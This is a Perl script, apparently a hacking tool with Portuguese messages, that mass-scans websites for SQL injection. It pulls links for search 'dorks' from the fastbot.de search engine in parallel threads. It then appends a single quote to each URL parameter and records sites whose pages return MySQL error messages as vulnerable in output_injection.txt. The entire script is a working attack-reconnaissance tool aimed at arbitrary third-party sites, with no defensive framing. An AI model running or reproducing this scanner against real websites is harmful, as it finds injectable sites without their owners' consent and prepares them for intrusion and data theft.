#!/usr/bin/perl
BEGIN { $ENV{ACTIVEPERL_CONFIG_DISABLE} = 1; }
 
#perl2exe_exclude "File/BSDGlob.pm"
#perl2exe_exclude "Compress/Bzip2.pm"
#perl2exe_exclude "I18N/Langinfo.pm"
#perl2exe_include "attributes.pm"
 
 
use strict;
no warnings;
use threads;
use threads::shared;
use LWP::UserAgent;
use HTTP::Request::Common qw(POST);
 
 
my $threads = 10;
 
my $ua = LWP::UserAgent->new;
$ua->timeout(15);
$ua->agent('Mozilla/5.0');
 
my @dorkz : shared;
my @linkz : shared;
 
system("cls");
system("color A");
print "++++++++++++++++++++++++++++++++++++++++++++++++\n";
print "+             SCANNER DORK FASTBOT             +\n";
print "+                                              +\n";
print "++++++++++++++++++++++++++++++++++++++++++++++++\n";
print "\n[i]Motor carregado: fastbot.de\n";
print "\[.]Iniciando...\n";
GetDorkz();

print "[i]Got ".scalar(@dorkz)." dorkz\n";
GetLinks();
while (threads->list) {}
print "[i]Got ".scalar(@linkz)." links\n";
print "[.]Iniciando...\n\n";
CheckLinks();
while (threads->list) {}
print "[!]Tudo feito, checar output_injection.txt\n\n";
 
 
sub CheckLinks {
        foreach my $link( @linkz ) {
                my  $ctr = 0;
                foreach my $thr ( threads->list ) { $ctr++; }
                if ($ctr < $threads){
                        threads->create( \&InjectionCheck, $link );
                }
                else { redo; }
        }
}
 
sub GetLinks {
        foreach my $dork( @dorkz ) {
                my  $ctr = 0;
                foreach my $thr ( threads->list ) { $ctr++; }
                if ($ctr < $threads){
                        threads->create( \&GetLinks_fastbot,$dork );
                }
                else { redo; }
        }
}
 
sub GetDorkz {
        open( DORKZ, "input.txt" ) or die "$!\n";
        while( defined( my $line_ = <DORKZ> ) ) {
                chomp( $line_ );
                push( @dorkz, $line_ );
        }
        close( DORKZ );
}
 
## FASTBOT-MOTOR
## http://www.fastbot.de/index.php?page=1&query=index.php?id=
sub GetLinks_fastbot {
        my $dork = shift;
        chomp( $dork );
        for( my $i = 1; $i < 11; $i++ ) {
                my $url = "http://www.fastbot.de/index.php?page=".$i."&query=".$dork;
                my $content = $ua->get($url)->content;
                while( $content =~ m/melden\.php\?url=(.+?)&query=/gi ) {
                        my $link = $1;
                        $link =~ s/&amp;/&/g;
                        #print $link."\n";
                        push( @linkz, $link );
                }
        }
        threads->detach();
}
 
sub InjectionCheck {
        my $link = shift;
        chomp( $link );
        print "[:]Verificando..: $link\n";
        my $content = $ua->get($link)->content;
        for(my $position = 0; ($position = index($link, "=", $position)) >= 0; $position++) {
                my $linkcpy = $link;
                substr($linkcpy, $position, 1) = "='";  
                my $content2 = $ua->get($linkcpy)->content;
                unless( $content eq $content2 ) {
                        if( $content2 =~ m/mysql_fetch_/i || $content2=~ m/You have an error in your SQL syntax/i || $content2 =~ m/tem um erro de sintaxe no seu SQL/i || $content2 =~ m/mysql_num_rows/i || $content2 =~ m/Division by zero in/i ) {
                                print "[+]VULL:========>>>>>>> ".$linkcpy."\n";
                                Output( $linkcpy );
                                threads->detach();
                        }
                }
        }
        threads->detach();
}
 
sub Output {
        my $para = shift;
        open (OUT, '>>output_injection.txt') or die("Não é possível gravar output_injection\n");
        print OUT $para."\n";
        close (OUT);
}